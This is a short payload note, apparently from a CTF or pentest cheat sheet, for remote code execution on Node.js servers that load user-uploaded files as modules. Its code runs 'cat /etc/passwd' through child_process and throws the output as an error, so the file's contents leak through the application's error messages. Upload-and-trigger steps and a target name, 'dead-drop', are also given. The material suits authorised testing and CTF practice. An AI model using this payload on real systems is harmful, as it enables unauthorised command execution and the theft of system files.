# Node.js Module Upload RCE (child_process)

A payload used when a Node.js server dynamically executes or imports user-uploaded files as modules.
This payload runs a command synchronously and throws an error containing the output, which is useful when the application displays error messages but not command output directly.

## Payload (`payload.js`)

```javascript
const { execSync } = require('child_process');
// Execute OS command and capture output
const result = execSync('cat /etc/passwd').toString();
// Throw an error with the output to exfiltrate it via application error handling
throw new Error(result);
```

Used on: **dead-drop**

To use, upload this script as a `.js` file, and trigger the application to load/require it.
